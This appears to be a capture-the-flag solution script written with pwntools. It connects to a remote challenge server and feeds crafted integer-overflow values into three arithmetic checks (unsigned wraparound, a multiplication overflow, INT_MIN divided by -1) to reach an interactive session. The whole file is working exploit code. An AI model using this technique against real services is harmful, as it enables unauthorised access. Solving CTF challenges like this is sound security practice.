from pwn import * 
from LibcSearcher import * 
context.log_level = 'debug' 
# p=process('./int')
p=remote('t.ctf.qwq.cc',49231)
elf=ELF('./int')
p.recvuntil(b'1.a-b=114,0<=a<114,0<=b<114\n')
p.sendline(b'113')
p.sendline(b'4294967295')
p.recvuntil(b'2.a*b=514,a>514,b>514\n')
p.sendline(b'447859')
p.sendline(b'9590')
p.recvuntil(b'3.a/b=ERROR,b!=0\n')
p.sendline(b'-2147483648')
p.sendline(b'-1')
p.interactive()